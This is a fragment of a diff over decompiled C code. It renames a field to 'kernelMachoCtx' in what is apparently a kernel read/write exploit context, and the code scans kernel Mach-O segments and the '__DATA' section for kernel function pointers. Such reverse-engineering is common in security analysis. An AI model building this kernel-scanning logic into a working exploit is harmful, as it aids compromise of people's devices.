+        scan_range[0] = krwCtx->kernelMachoCtx;
         scan_range[1] = (__int64 *)v8;
         scan_range[2] = (__int64 *)v5;
         v19 = macho_find_segment(scan_range, 1);
@@ -47012,11 +47012,11 @@ LABEL_9:
         if ( !v10 )
           break;
         v11 = v10;
-        macho_walk_segment_by_name_0(krwCtx->gap_0x19F8, v10, v5, 0);
+        macho_walk_segment_by_name_0(krwCtx->kernelMachoCtx, v10, v5, 0);
         v12 = *(uint64_t *)(v11 + 16);
         if ( v12 )
         {
-          scan_range[0] = krwCtx->gap_0x19F8;
+          scan_range[0] = krwCtx->kernelMachoCtx;
           scan_range[1] = (__int64 *)v12;
           scan_range[2] = (__int64 *)80;
           v19 = macho_find_segment(scan_range, 0);
@@ -47024,7 +47024,7 @@ LABEL_9:
           if ( v13 )
           {
             v14 = (const char *)v13;
-            macho_walk_segment_by_name_0(krwCtx->gap_0x19F8, v13, 0x50u, 0);
+            macho_walk_segment_by_name_0(krwCtx->kernelMachoCtx, v13, 0x50u, 0);
           }
           else
           {
@@ -47092,7 +47092,7 @@ __int64 __fastcall find_kfunc_ptr_in_kernel_data(struct_krwCtx *krwCtx, __int64 
     else
       return 163878;
   }
-  macho_getsectbyname("__DATA", krwCtx->gap_0x19F8, "__data", dataSect);
+  macho_getsectbyname("__DATA", krwCtx->kernelMachoCtx, "__data", dataSect);
   v9 = dataSect[1];
   if ( !dataSect[1] || !dataSect[2] )
     return 163855;
